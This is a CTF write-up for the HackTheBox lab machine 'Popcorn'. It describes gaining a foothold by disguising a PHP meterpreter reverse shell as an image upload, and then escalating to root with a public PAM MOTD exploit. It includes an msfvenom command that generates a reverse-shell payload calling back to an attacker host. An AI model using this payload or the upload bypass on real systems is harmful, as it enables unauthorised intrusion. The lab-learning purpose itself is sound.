---
title: "HackTheBox Writeup: Popcorn"
date: 2019-08-23T02:36:15+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---
{{%summary%}}
![img](/images/popcorn-writeup/1.png)
{{%/summary%}}

A medium difficulty Linux box, where pretty much all the difficulty comes from the road to user, getting root consists in a very straightforward local privilege escalation exploit, user access is achieved by uploading a PHP shell from an image upload page.

---

## Enumeration

Let's begin right away with an nmap scan to identify running services:

![img](/images/popcorn-writeup/2.png)

Only two open ports, one for SSH access and the other leads to a standard installation of Apache, or so it seems from the homepage at least:

![img](/images/popcorn-writeup/3.png)

We don't have anywhere else to look for content so we run a dirb scan to enumerate hidden files and folders within the web server, and of course, we find out there is quite the amount of content, it's just hidden from casual lookers:

![img](/images/popcorn-writeup/4.png)

The torrent folder seems to contain a whole portal to share torrents:

![img](/images/popcorn-writeup/5.png)

We can even create our own account but I'll save that function up for later, because dirb has also found a "database" directory within the files in /torrent, which contains the backup of a database in SQL format that we can read. The most interesting part is at the very end of the file:

![img](/images/popcorn-writeup/6.png)

According to the structure of the users table, we have found the hashed password of user Admin, which has admin privileges. The password is hashed though so we must obtain the plain text equivalent first, it looks like an MD5 hash, so with a bit of lucky we may find a match on CrackStation's huge database:

![img](/images/popcorn-writeup/7.png)

Found it! It's "admin12", so now we can log in on the website and see what functionalities it has to offer:

![img](/images/popcorn-writeup/8.png)

So the password has been changed since the last backup, running hydra against the login with a list common passwords doesn't seem to work either, making this a rabbiy hole. So let's go look for something more interesting, perhaps after creating our own personal account:

![img](/images/popcorn-writeup/9.png)

Every user has access to the Upload section, where we can upload torrents to share with other users. The web application makes sure we are only trying to upload torrents, in fact trying to upload any other kind of file causes an error:

![img](/images/popcorn-writeup/10.png)

So I'm just going to grab a random .torrent file, I went for a Kali Linux image torrent because there is already one in the homepage. Once uploaded we can see there is an "add screenshot" feature, which turns out to be much less secure than the torrent upload form.

---

## Exploitation: image upload bypass

Let's see if a meterpreter shell can be sent as a fake image:

```shell-session
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.67 LPORT=9090 -o baudy.php
```

![img](/images/popcorn-writeup/12.png)

Intercept the upload POST request with Burp and change the Content-Type header of the shell from Application/php into image/jpeg and that's enough to trick the application into uploading the file, without having to alterate the extension either:

![img](/images/popcorn-writeup/13.png)

![img](/images/popcorn-writeup/14.png)

The web server accepted it and uploaded the file without hesitation. Looking back to our old dirb scan we also found a folder for uploads, located in /torrent/upload:

![img](/images/popcorn-writeup/15.png)

Our shell has been renamed but is still there intact, so we can start a listener on our host and then start the shell by clicking on it:

![img](/images/popcorn-writeup/16.png)

We are in as www-data and we have access to /home/george, where we find our user flag. In this same home folder we have a .cache subfolder that contains a weird little file:

![img](/images/popcorn-writeup/17.png)

---

## Exploitation: PAM MOTD privilege escalation

Looking this up on Google immediately reveals a [local privilege escalation exploit](https://www.exploit-db.com/raw/14339) so we download it on our box and pass it on to Popcorn with a temporary HTTP server, I use PHP for this:

![img](/images/popcorn-writeup/18.png)

![img](/images/popcorn-writeup/19.png)


1. Change directory to /tmp/ to have write permissions
+ Download the exploit from our box
+ Add execute permissions to the exploit
+ Run
+ Profit





















